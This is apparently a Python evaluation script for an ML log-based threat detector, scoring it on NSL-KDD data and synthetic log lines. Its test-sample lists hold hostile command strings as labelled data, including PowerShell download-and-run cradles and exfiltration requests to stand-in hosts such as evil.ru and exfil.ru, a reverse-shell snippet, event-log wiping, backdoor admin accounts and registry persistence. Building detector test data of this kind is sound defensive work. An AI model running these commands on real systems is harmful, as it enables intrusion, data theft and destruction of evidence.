"""
test.py -- Full evaluation of UpgradedAMIDES using the official NSL-KDD test set.

Test data sources (in priority order):
  1. data/KDDTest+.csv       -- official NSL-KDD held-out test set (22,544 rows)
                               Never seen during training -> true generalisation score
  2. SOCBED synthetic samples -- fresh batch generated with separate seeds (!= training)
  3. Fallback                -- 20% stratified split from training data (if nothing else)

Sections:
  1. Model parameters   -- XGBoost & TF-IDF settings
  2. Test dataset info  -- source, size, class distribution
  3. Metrics report     -- accuracy, precision, recall, F1, MCC, Kappa per class
  4. Confusion matrix   -- ASCII heatmap (rows=Actual, cols=Predicted)
  5. Spot-check table   -- 15 hand-crafted log lines, colour-coded

Usage:
  # First time: download the test set
  python data/data.py

  # Then evaluate
  python ml_engine/test.py
"""

import sys
import random
from pathlib import Path
from collections import Counter

import numpy as np
from sklearn.model_selection import train_test_split
from sklearn.metrics import (
    accuracy_score,
    classification_report,
    confusion_matrix,
    matthews_corrcoef,
    cohen_kappa_score,
)

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

MODEL_PATH    = PROJECT_ROOT / 'ml_engine' / 'upgraded_amides.pkl'
NSLKDD_TEST   = PROJECT_ROOT / 'data' / 'KDDTest+.csv'      # official test set
NSLKDD_TRAIN  = PROJECT_ROOT / 'data' / 'KDDTrain+.csv'     # fallback only
SOCBED_DIR    = PROJECT_ROOT / 'ml_engine' / 'model'

# -- ANSI colours --------------------------------------------------------------
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
CYAN   = "\033[96m"
ORANGE = "\033[33m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

_SEV_COLOR = {
    'none': GREEN, 'low': CYAN, 'medium': YELLOW, 'high': ORANGE, 'critical': RED,
}

# -- 15 hand-crafted spot-check lines -----------------------------------------
SPOT_CHECKS = [
    ("NORMAL",
     "GET /index.html HTTP/1.1 200 OK user-agent=Mozilla/5.0 (Windows NT 10.0)"),
    ("NORMAL",
     "EventID=4624 LogonType=2 UserName=alice SourceIP=10.0.0.5 Status=success"),

    ("BRUTE_FORCE",
     "192.168.4.21 - Failed password for root from 192.168.4.21 port 4521 ssh2"),
    ("BRUTE_FORCE",
     "Multiple failed login attempts: 429 failures from 10.0.0.99 in 60 seconds -- account locked"),
    ("BRUTE_FORCE",
     "AUTH FAIL: invalid credentials for admin@corp.com attempt 47 of 50 threshold exceeded"),

    ("DOS_ATTACK",
     "SYN flood detected: 50000 packets/sec from 203.0.113.88 to port 80 -- dropping connections"),
    ("DOS_ATTACK",
     "DDoS UDP flood: source=10.0.1.5 packets=99999 rate=high overflow detected"),
    ("DOS_ATTACK",
     "neptune tcp 0 0 tcp_packets=999999 land attack detected destination unreachable"),

    ("MALWARE",
     "powershell -EncodedCommand SQBFAFgA -NonInteractive -WindowStyle Hidden"),
    ("MALWARE",
     "Process: malware.exe spawned by explorer.exe connecting outbound to 185.220.101.5:4444"),
    ("MALWARE",
     "Trojan.Generic detected in C:\\Users\\user\\AppData\\Roaming\\update.exe quarantine failed"),

    ("PORT_SCAN",
     "nmap scan detected: 203.0.113.88 probed 1024 TCP ports in 30 seconds"),
    ("PORT_SCAN",
     "PortScan portsweep source=198.51.100.5 dest_ports=22,23,80,443,8080 probe"),

    ("LOG_EVASION",
     "wevtutil cl Security && wevtutil cl System && wevtutil cl Application"),
    ("LOG_EVASION",
     "Clear-EventLog -LogName Security,System,Application -Confirm:$false auditpol /clear"),
]


# -- SOCBED test-set generators (different seeds from training) -----------------
# Training uses seeds 42-45.  Test uses seeds 142-145 to guarantee different samples.

def _socbed_test_samples(n_per_category: int = 200) -> tuple[list, list]:
    """
    Generate a fresh batch of SOCBED-style log samples for testing.
    Uses seeds 142-145 (vs training seeds 42-45) so samples differ from training.
    """
    # -- PowerShell ------------------------------------------------------------
    rng = random.Random(142)
    ps_mal = [
        "powershell -nop -w hidden -encodedcommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
        "powershell.exe -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.ru/s.ps1')\"",
        "powershell -c \"$client=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream=$client.GetStream()\"",
        "wevtutil el | Foreach-Object {wevtutil cl $_} && auditpol /clear /y",
        "powershell Set-MpPreference -DisableRealtimeMonitoring $true; Invoke-Mimikatz",
        "powershell -sta -nop -enc cwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQA=",
        "Remove-Item C:\\Windows\\System32\\winevt\\Logs\\*.evtx -Force -ErrorAction SilentlyContinue",
        "powershell (New-Object Net.WebClient).DownloadFile('http://c2.bad.com/rat.exe','C:\\tmp\\svc.exe')",
    ]
    ps_ben = [
        "powershell Get-Process | Sort-Object CPU -Descending | Select-Object -First 10",
        "powershell -ExecutionPolicy Bypass -File C:\\deploy\\install.ps1",
        "Get-ADUser -Filter * -Properties * | Export-Csv C:\\reports\\users.csv",
        "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force",
    ]
    n_m = n_per_category
    n_b = n_per_category // 2
    lines = [rng.choice(ps_mal) for _ in range(n_m)] + [rng.choice(ps_ben) for _ in range(n_b)]
    labels = ['LOG_EVASION'] * n_m + ['NORMAL'] * n_b

    # -- Process creation ------------------------------------------------------
    rng2 = random.Random(143)
    pc_mal = [
        "EventID=4688 NewProcessName=cmd.exe CommandLine=cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add",
        "EventID=4688 NewProcessName=wscript.exe CommandLine=wscript C:\\tmp\\dropper.vbs",
        "EventID=1102 AuditLogCleared SubjectUserName=evil SubjectDomainName=CORP",
        "EventID=4688 NewProcessName=mshta.exe CommandLine=mshta http://evil.com/payload.hta",
        "EventID=4688 NewProcessName=cscript.exe CommandLine=cscript //E:vbscript C:\\tmp\\bypass.vbs",
        "EventID=4688 NewProcessName=reg.exe CommandLine=reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Persist /d C:\\tmp\\evil.exe /f",
    ]
    pc_ben = [
        "EventID=4688 NewProcessName=explorer.exe ParentProcess=userinit.exe",
        "EventID=4688 NewProcessName=dllhost.exe ParentProcess=svchost.exe",
        "EventID=4688 NewProcessName=taskmgr.exe CommandLine=taskmgr.exe /4",
    ]
    lines  += [rng2.choice(pc_mal) for _ in range(n_m)] + [rng2.choice(pc_ben) for _ in range(n_b)]
    labels += ['LOG_EVASION'] * n_m + ['NORMAL'] * n_b

    # -- Proxy / web -----------------------------------------------------------
    rng3 = random.Random(144)
    pw_mal = [
        "GET http://c2.attacker.net/beacon?uid=WIN-01&os=win10 HTTP/1.1 200 user-agent=powershell/5.1",
        "POST http://exfil.ru/upload content-length=5242880 bytes-sent=5000000",
        "CONNECT 198.51.100.33:4444 HTTP/1.1 200 tunnel duration=3600s",
        "GET http://raw.githubusercontent.com/hacker/tools/main/mimikatz.ps1 HTTP/1.1 200 user-agent=powershell",
        "GET http://pastebin.com/raw/Zq9xY2mP HTTP/1.1 200 user-agent=python-requests/2.28",
    ]
    pw_ben = [
        "GET https://www.microsoft.com/en-us/software-download HTTP/1.1 200",
        "POST https://api.slack.com/api/chat.postMessage HTTP/1.1 200",
        "GET https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz HTTP/1.1 200",
    ]
    lines  += [rng3.choice(pw_mal) for _ in range(n_m)] + [rng3.choice(pw_ben) for _ in range(n_b)]
    labels += ['LOG_EVASION'] * n_m + ['NORMAL'] * n_b

    # -- Registry --------------------------------------------------------------
    rng4 = random.Random(145)
    rg_mal = [
        "EventID=13 TargetObject=HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\update Details=C:\\tmp\\backdoor.exe",
        "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v Security Packages /t REG_MULTI_SZ /d mimilib /f",
        "EventID=13 TargetObject=HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware Details=1",
        "EventID=4657 ObjectName=HKLM\\SAM\\SAM\\Domains\\Account OperationType=SetValue NewValue=<binary>",
        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe /v Debugger /d cmd.exe",
    ]
    rg_ben = [
        "EventID=13 TargetObject=HKCU\\SOFTWARE\\Microsoft\\OneDrive\\Version Details=22.201.0918.0003",
        "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "EventID=12 TargetObject=HKLM\\SOFTWARE\\Google\\Chrome\\BLBeacon\\version Details=111.0",
    ]
    lines  += [rng4.choice(rg_mal) for _ in range(n_m)] + [rng4.choice(rg_ben) for _ in range(n_b)]
    labels += ['LOG_EVASION'] * n_m + ['NORMAL'] * n_b

    return lines, labels


# -- Helpers -------------------------------------------------------------------

def _csev(severity: str) -> str:
    return _SEV_COLOR.get(severity, RESET) + severity.upper() + RESET


def _bar(value: float, width: int = 20, color: str = GREEN) -> str:
    filled = int(round(max(value, 0.0) * width))
    return color + "#" * filled + DIM + "." * (width - filled) + RESET


def _section(title: str):
    print(f"\n{BOLD}{'=' * 70}{RESET}")
    print(f"{BOLD}  {title}{RESET}")
    print(f"{BOLD}{'=' * 70}{RESET}")


def _confusion_ascii(cm: np.ndarray, class_names: list) -> str:
    n      = len(class_names)
    col_w  = max(len(c) for c in class_names) + 1
    num_w  = max(5, len(str(int(cm.max()))))
    short  = [c[:8] for c in class_names]

    lines = []
    pad   = " " * (col_w + 3)
    lines.append(f"{DIM}{'Predicted ->':>{col_w + 3 + (num_w + 2) * n // 2}}{RESET}")
    lines.append(f"{BOLD}{pad}{'  '.join(f'{s:>{num_w}}' for s in short)}{RESET}")
    lines.append(f"  {DIM}{'-' * (col_w + 1 + (num_w + 2) * n)}{RESET}")

    row_max = cm.max(axis=1, keepdims=True)
    for i, row_name in enumerate(class_names):
        cells = []
        for j, val in enumerate(cm[i]):
            val = int(val)
            if val == 0:
                cell = f"{DIM}{val:>{num_w}}{RESET}"
            elif i == j:
                cell = f"{GREEN}{BOLD}{val:>{num_w}}{RESET}"
            else:
                intensity = val / max(int(row_max[i][0]), 1)
                c = RED if intensity > 0.3 else YELLOW if intensity > 0.1 else ORANGE
                cell = f"{c}{val:>{num_w}}{RESET}"
            cells.append(cell)
        prefix = f"  {CYAN}{row_name:<{col_w}}{RESET} "
        lines.append(prefix + "  ".join(cells))

    return "\n".join(lines)


# -- Main ----------------------------------------------------------------------

def main():
    print(f"\n{BOLD}{'=' * 70}{RESET}")
    print(f"{BOLD}   UpgradedAMIDES -- Evaluation Report (Official Test Set){RESET}")
    print(f"{BOLD}{'=' * 70}{RESET}")

    # Load model ---------------------------------------------------------------
    if not MODEL_PATH.exists():
        print(f"\n{RED}[ERROR] Model not found: {MODEL_PATH}{RESET}")
        print("  Train first:  python ml_engine/train.py")
        sys.exit(1)

    print(f"\nLoading model: {MODEL_PATH}")
    from ml_engine.upgraded_amides import UpgradedAMIDES, REMEDIATION_MAP, SEVERITY_MAP
    model  = UpgradedAMIDES.load(str(MODEL_PATH))
    classes = list(model.label_encoder.classes_)
    print(f"Loaded.  Classes: {classes}")

    # =========================================================================
    # Section 1 -- Model Parameters
    # =========================================================================
    _section("1 -- Model Parameters")

    xgb_p   = model.xgb.get_params()
    tfidf_p = model.tfidf.get_params()
    n_tfidf = len(model.tfidf.vocabulary_) if hasattr(model.tfidf, 'vocabulary_') else tfidf_p.get("max_features", "?")

    print(f"\n  {BOLD}XGBoost{RESET}")
    xgb_show = [
        ("n_estimators",     xgb_p.get("n_estimators")),
        ("max_depth",        xgb_p.get("max_depth")),
        ("learning_rate",    xgb_p.get("learning_rate")),
        ("subsample",        xgb_p.get("subsample")),
        ("colsample_bytree", xgb_p.get("colsample_bytree")),
        ("objective",        xgb_p.get("objective")),
        ("eval_metric",      xgb_p.get("eval_metric")),
        ("tree_method",      xgb_p.get("tree_method")),
        ("num_class",        len(classes)),
        ("random_state",     xgb_p.get("random_state")),
    ]
    for k, v in xgb_show:
        print(f"    {CYAN}{k:<22}{RESET} {v}")

    print(f"\n  {BOLD}TF-IDF Vectorizer{RESET}")
    tfidf_show = [
        ("analyzer",       tfidf_p.get("analyzer")),
        ("ngram_range",    tfidf_p.get("ngram_range")),
        ("max_features",   tfidf_p.get("max_features")),
        ("sublinear_tf",   tfidf_p.get("sublinear_tf")),
        ("min_df",         tfidf_p.get("min_df")),
        ("vocabulary_size",n_tfidf),
    ]
    for k, v in tfidf_show:
        print(f"    {CYAN}{k:<22}{RESET} {v}")

    print(f"\n  {BOLD}Combined Feature Matrix{RESET}")
    print(f"    {CYAN}{'TF-IDF features':<22}{RESET} {n_tfidf}")
    print(f"    {CYAN}{'Numeric features':<22}{RESET} 25")
    print(f"    {CYAN}{'Total features':<22}{RESET} {n_tfidf + 25}")
    print(f"    {CYAN}{'Detected classes':<22}{RESET} {classes}")

    # =========================================================================
    # Section 2 -- Build Test Dataset
    # =========================================================================
    _section("2 -- Test Dataset")

    test_lines:  list[str] = []
    test_labels: list[str] = []
    data_source = ""

    # -- Priority 1: official KDDTest+ (never used in training) ---------------
    if NSLKDD_TEST.exists():
        print(f"  {GREEN}[OK]{RESET} Official NSL-KDD test set found: {NSLKDD_TEST}")
        nsl_lines, nsl_labels = model.train_from_csv(str(NSLKDD_TEST))
        test_lines.extend(nsl_lines)
        test_labels.extend(nsl_labels)
        data_source = "KDDTest+.csv (official NSL-KDD held-out set)"
        print(f"    Loaded {len(nsl_lines):,} samples")
    else:
        print(f"  {YELLOW}!{RESET} KDDTest+.csv not found. Run: python data/data.py")

    # -- Priority 2: SOCBED test samples (fresh seeds, unseen during training) -
    if SOCBED_DIR.exists():
        print(f"  {GREEN}[OK]{RESET} Generating SOCBED test samples (seeds 142-145, != training)...")
        soc_lines, soc_labels = _socbed_test_samples(n_per_category=200)
        test_lines.extend(soc_lines)
        test_labels.extend(soc_labels)
        if data_source:
            data_source += " + SOCBED synthetic test samples"
        else:
            data_source = "SOCBED synthetic test samples (seeds 142-145)"
        print(f"    Generated {len(soc_lines):,} samples")

    # -- Fallback: 20% split from training data --------------------------------
    if not test_lines:
        print(f"\n  {YELLOW}[FALLBACK]{RESET} No dedicated test data found.")
        print("  Loading training data and taking a 20% stratified split ...")
        if NSLKDD_TRAIN.exists():
            fl, ll = model.train_from_csv(str(NSLKDD_TRAIN))
            test_lines.extend(fl)
            test_labels.extend(ll)
        if SOCBED_DIR.exists():
            sl, ll = model.train_from_socbed(str(SOCBED_DIR))
            test_lines.extend(sl)
            test_labels.extend(ll)

        if not test_lines:
            print(f"  {RED}[ERROR] No data available for evaluation.{RESET}")
            sys.exit(1)

        _, test_lines, _, test_labels = train_test_split(
            test_lines, test_labels,
            test_size=0.20, random_state=42, stratify=test_labels,
        )
        data_source = "20% stratified split of training data (fallback)"

    # Distribution
    dist = Counter(test_labels)
    print(f"\n  {BOLD}Test set{RESET}  ({data_source})")
    print(f"  Total samples: {BOLD}{len(test_lines):,}{RESET}")
    print(f"\n  {'Class':<20} {'Count':>8}  {'%':>6}  Distribution")
    print(f"  {'-' * 60}")
    for cls in sorted(dist):
        pct = dist[cls] / len(test_labels)
        print(f"  {CYAN}{cls:<20}{RESET} {dist[cls]:>8,}  {pct*100:>5.1f}%  {_bar(min(pct * 5, 1.0), 18)}")

    # =========================================================================
    # Section 3 -- Metrics
    # =========================================================================
    _section("3 -- Evaluation Metrics")

    print(f"  Running predictions on {len(test_lines):,} test samples ...")
    y_pred = [model.predict(line)['threat_type'] for line in test_lines]
    y_true = test_labels

    acc   = accuracy_score(y_true, y_pred)
    mcc   = matthews_corrcoef(y_true, y_pred)
    kappa = cohen_kappa_score(y_true, y_pred)

    # Overall
    print(f"\n  {BOLD}Overall Scores{RESET}")
    for name, val, thresh in [
        ("Accuracy",             acc,   0.90),
        ("Matthews Corr. Coef", mcc,   0.80),
        ("Cohen's Kappa",       kappa, 0.80),
    ]:
        color = GREEN if val >= thresh else YELLOW if val >= thresh - 0.15 else RED
        bar   = _bar(max(val, 0.0), 24, color)
        print(f"    {CYAN}{name:<24}{RESET} {color}{val:7.4f}{RESET}  {bar}")

    # Per-class
    present = sorted(set(y_true) | set(y_pred))
    report  = classification_report(
        y_true, y_pred,
        labels=present, target_names=present,
        output_dict=True, zero_division=0,
    )

    print(f"\n  {BOLD}Per-Class Report{RESET}  (n={len(test_lines):,})")
    print(f"  {'Class':<17} {'Precision':>10} {'Recall':>10} {'F1-Score':>10} {'Support':>10}")
    print(f"  {'-' * 65}")
    for cls in present:
        r   = report[cls]
        f1c = GREEN if r['f1-score'] > 0.85 else YELLOW if r['f1-score'] > 0.65 else RED
        print(
            f"  {CYAN}{cls:<17}{RESET}"
            f" {r['precision']:>10.4f}"
            f" {r['recall']:>10.4f}"
            f" {f1c}{r['f1-score']:>10.4f}{RESET}"
            f" {int(r['support']):>10,}"
        )
    print(f"  {'-' * 65}")
    for avg_key, label in [("macro avg", "Macro avg"), ("weighted avg", "Weighted avg")]:
        if avg_key in report:
            r = report[avg_key]
            print(
                f"  {BOLD}{label:<17}{RESET}"
                f" {r['precision']:>10.4f}"
                f" {r['recall']:>10.4f}"
                f" {r['f1-score']:>10.4f}"
                f" {int(r['support']):>10,}"
            )

    # =========================================================================
    # Section 4 -- Confusion Matrix
    # =========================================================================
    _section("4 -- Confusion Matrix  (rows = Actual, cols = Predicted)")

    cm = confusion_matrix(y_true, y_pred, labels=present)
    print()
    print(_confusion_ascii(cm, present))

    print(f"\n  {BOLD}Per-Class Accuracy  (diagonal / row total){RESET}")
    for i, cls in enumerate(present):
        row_total = int(cm[i].sum())
        cls_acc   = cm[i][i] / row_total if row_total > 0 else 0.0
        color     = GREEN if cls_acc > 0.85 else YELLOW if cls_acc > 0.65 else RED
        print(f"    {CYAN}{cls:<17}{RESET} {color}{cls_acc:6.2%}{RESET}  "
              f"{_bar(cls_acc, 20, color)}  ({int(cm[i][i]):,}/{row_total:,})")

    # =========================================================================
    # Section 5 -- Spot-Check (15 hand-crafted lines)
    # =========================================================================
    _section("5 -- Spot-Check: 15 Hand-Crafted Log Lines")

    spot_correct = 0
    spot_results = []
    for expected, log_line in SPOT_CHECKS:
        r  = model.predict(log_line)
        ok = r['threat_type'] == expected
        if ok:
            spot_correct += 1
        spot_results.append((expected, r, log_line, ok))

    print(f"\n  {BOLD}{'#':<3} {'EXPECTED':<17} {'PREDICTED':<17} {'CONF':>6}  {'SEVERITY':<12} OK{RESET}")
    print("  " + "-" * 66)
    for i, (expected, r, log_line, ok) in enumerate(spot_results, 1):
        pred    = r['threat_type']
        conf    = f"{r['confidence']*100:.1f}%"
        sev     = _csev(r['severity'])
        tick    = f"{GREEN}[OK]{RESET}" if ok else f"{RED}[X]{RESET}"
        exp_str = CYAN + expected + RESET
        prd_str = (GREEN if ok else RED) + pred + RESET
        print(f"  {i:<3} {exp_str:<26} {prd_str:<26} {conf:>6}  {sev:<21} {tick}")

    spot_acc = spot_correct / len(SPOT_CHECKS) * 100
    bar_n    = int(spot_acc / 100 * 30)
    print(f"\n  Spot-check: {BOLD}{spot_correct}/{len(SPOT_CHECKS)} = {spot_acc:.1f}%{RESET}  "
          f"{GREEN}{'#' * bar_n}{DIM}{'.' * (30 - bar_n)}{RESET}")

    # Signal analysis
    print(f"\n  {BOLD}-- Signal Analysis (first detected threat) --{RESET}")
    for expected, r, log_line, _ in spot_results:
        if r['is_threat'] and r['top_signals']:
            print(f"  Log     : {log_line[:72]}...")
            print(f"  Detected: {ORANGE}{r['threat_type']}{RESET}  "
                  f"severity={_csev(r['severity'])}  conf={r['confidence']*100:.1f}%")
            print(f"  Signals : {r['top_signals']}")
            print(f"  Actions : {', '.join(r['remediation_actions'])}")
            break

    # -- Summary ---------------------------------------------------------------
    _section("Summary")
    macro_f1    = report.get('macro avg',    {}).get('f1-score', 0)
    weighted_f1 = report.get('weighted avg', {}).get('f1-score', 0)
    acc_c = GREEN if acc >= 0.90 else YELLOW if acc >= 0.75 else RED

    print(f"\n  {BOLD}Data source        {RESET}: {data_source}")
    print(f"  {BOLD}Test set size      {RESET}: {len(test_lines):,} samples")
    print(f"  {BOLD}Hold-out Accuracy  {RESET}: {acc_c}{acc:.4f}  ({acc:.2%}){RESET}")
    print(f"  {BOLD}Macro F1-Score     {RESET}: {macro_f1:.4f}")
    print(f"  {BOLD}Weighted F1-Score  {RESET}: {weighted_f1:.4f}")
    print(f"  {BOLD}MCC                {RESET}: {mcc:.4f}")
    print(f"  {BOLD}Cohen's Kappa      {RESET}: {kappa:.4f}")
    print(f"  {BOLD}Spot-check         {RESET}: {spot_correct}/{len(SPOT_CHECKS)} = {spot_acc:.1f}%")
    print(f"  {BOLD}Classes evaluated  {RESET}: {present}")
    print(f"\n{BOLD}{'=' * 70}{RESET}\n")


if __name__ == '__main__':
    main()
